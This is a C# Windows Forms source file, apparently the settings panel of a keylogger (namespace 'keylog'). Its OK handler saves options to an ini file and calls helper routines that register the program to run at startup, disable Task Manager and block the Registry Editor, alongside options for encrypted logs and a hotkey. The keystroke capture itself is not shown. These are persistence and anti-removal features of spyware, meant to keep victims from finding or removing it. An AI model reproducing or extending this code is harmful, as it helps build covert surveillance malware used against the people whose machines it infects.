using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;
using tt;

namespace keylog
{
    public partial class General : UserControl
    {
        public General()
        {
            InitializeComponent();
        }
        
        public enum TaskManager
        {
            Enabled,
            Disabled
        }

        private void btn_OK_Click(object sender, EventArgs e)
        {
            Dictionary<string, string> conf = new Dictionary<string, string>();

            if (cb_runaswindowstartsup.Checked)
            {
                conf.Add("RunOnStartUp", "true");
                Functions.RunStartUp();
            }
            else
            {
                conf.Add("RunOnStartUp", "false");
                Functions.DontRunStartUp();
            }

            if (cb_enableengcryplogs.Checked)
                conf.Add("EncryptLog", "true");
            else
                conf.Add("EncryptLog", "false");

            if (cb_hotkey.Checked)
                conf.Add("HotKey", "true");
            else
                conf.Add("HotKey", "false");

            if (cb_enabletaskmanager.Checked)
            {
                // enable task manager
                conf.Add("TaskManager", "true");
                Functions.SetTaskManager(true);
            }
            else
            {
                // disable task manager
                conf.Add("TaskManager", "false");
                Functions.SetTaskManager(false);
            }

            if (cb_enableregistryeditor.Checked)
            {
                // enable = allow access
                conf.Add("RegistryEditor", "true");
                Functions.PreventAccessRegistryEditor(false);
            }
            else
            {
                // disable = prevent access
                conf.Add("RegistryEditor", "false");
                Functions.PreventAccessRegistryEditor(true);
            }

            using (StreamWriter file = new StreamWriter("general_conf.ini"))
                foreach (var entry in conf)
                    file.WriteLine("{0},{1}", entry.Key, entry.Value);
        }

        private void General_Load(object sender, EventArgs e)
        {
            Dictionary<string, string> conf = new Dictionary<string, string>();
            if (File.Exists("general_conf.ini"))
            {
                Functions.Load_File("general_conf.ini", conf);

                cb_runaswindowstartsup.Checked = Boolean.Parse(conf["RunOnStartUp"]);
                cb_enableengcryplogs.Checked = Boolean.Parse(conf["EncryptLog"]);
                cb_enableregistryeditor.Checked = Boolean.Parse(conf["RegistryEditor"]);
                cb_enabletaskmanager.Checked = Boolean.Parse(conf["TaskManager"]);
                cb_hotkey.Checked = Boolean.Parse(conf["HotKey"]);
            }
        }
    }
}
